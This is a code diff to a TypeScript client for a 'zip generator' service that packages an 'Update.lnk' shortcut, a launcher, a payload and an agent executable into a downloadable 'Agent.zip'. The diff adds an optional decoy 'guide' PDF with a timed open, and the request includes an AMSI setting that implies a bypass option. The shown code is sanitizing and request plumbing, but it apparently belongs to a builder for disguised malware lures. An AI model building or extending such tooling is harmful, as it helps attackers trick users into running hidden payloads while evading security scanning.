@@ -34,6 +34,15 @@ export interface CallZipGeneratorOpts {
   updateLinkName?: string; // the .lnk entry name (default "Update.lnk")
   innerFolder?: string; // the subfolder holding launcher+payload (default "launcher")
   zipName?: string; // the served download filename (default "Agent.zip")
+  // Task 77 (FIX 5) — optional attached guide PDF. `pdfBase64` is the full
+  // `data:application/pdf;base64,…` URL (validated upstream in the route);
+  // `pdfName` is the bare `*.pdf` entry name. When unset both keys are omitted
+  // from the /build body so the no-PDF flow stays byte-identical.
+  pdfBase64?: string;
+  pdfName?: string;
+  // Optional PDF open delay in seconds (0–120, generator default 0 = open
+  // immediately). Omitted unless explicitly set.
+  pdfDelaySec?: number;
 }
 
 // FIX 3: bare-name sanitizer — mirrors the generator's `clean` rule so a user
@@ -44,6 +53,20 @@ function safeArtifactName(value: string | undefined): string {
   const s = (value ?? "").trim();
   if (!s) return "";
   if (INVALID_ARTIFACT_NAME.test(s) || s.includes("..") || s.length > 64) return "";
+  return s;
+}
+
+// Task 77 (FIX 5): PDF entry-name sanitizer — mirrors the generator's pdfName
+// rule (`routes.ts` postBuildZip: bare `*.pdf`, ≤64 chars, no `/ \ : "` /
+// control chars / `..`). Blank or invalid -> "" (caller omits the PDF name so
+// the generator falls back to `guide.pdf`; the route rejects invalid names
+// earlier with a 400, so this is defense-in-depth, not the first gate).
+const INVALID_PDF_NAME = /[/\\:"\u0000-\u001f]/;
+function safePdfName(value: string | undefined): string {
+  const s = (value ?? "").trim();
+  if (!s) return "";
+  if (!/\.pdf$/i.test(s)) return "";
+  if (INVALID_PDF_NAME.test(s) || s.includes("..") || s.length > 64) return "";
   return s;
 }
 
@@ -87,6 +110,18 @@ export async function callZipGenerator(
   }
   const flagInnerFolder = safeArtifactName(opts.innerFolder);
   const flagZipName = safeArtifactName(opts.zipName);
+  // Task 77 (FIX 5): sanitize the optional PDF name once; blank/invalid -> ""
+  // (omitted below so the generator uses its `guide.pdf` default). The base64
+  // `pdf` payload itself is validated upstream in the route (magic + size).
+  const flagPdfName = safePdfName(opts.pdfName);
+  const rawPdfDelay =
+    typeof opts.pdfDelaySec === "number" ? opts.pdfDelaySec : Number(opts.pdfDelaySec);
+  const flagPdfDelaySec =
+    Number.isFinite(rawPdfDelay) && rawPdfDelay >= 0 && rawPdfDelay <= 120
+      ? Math.floor(rawPdfDelay)
+      : undefined;
+  const hasPdf =
+    typeof opts.pdfBase64 === "string" && opts.pdfBase64.trim() !== "";
 
   try {
     const res = await fetch(`${env.zipGeneratorUrl}/build`, {
@@ -108,6 +143,12 @@ export async function callZipGenerator(
         // generator allowlists it and ignores unknown/foreign values).
         ...(opts.downloadHost ? { downloadHost: opts.downloadHost } : {}),
         ...(opts.launcherMode ? { launcherMode: true } : {}),
+        // Task 77 (FIX 5): optional guide PDF at the TOP level (sibling of
+        // launcherMode, NOT inside flags). Omitted entirely when no PDF is
+        // attached so the no-PDF flow stays byte-identical.
+        ...(hasPdf ? { pdf: (opts.pdfBase64 as string).trim() } : {}),
+        ...(hasPdf && flagPdfName ? { pdfName: flagPdfName } : {}),
+        ...(hasPdf && flagPdfDelaySec !== undefined ? { pdfDelaySec: flagPdfDelaySec } : {}),
         flags: {
           amsi: "none", // Guardrail: AMSI default none — never a bypass by default.
           fileName: opts.fileName ?? "trmm-agent.exe",
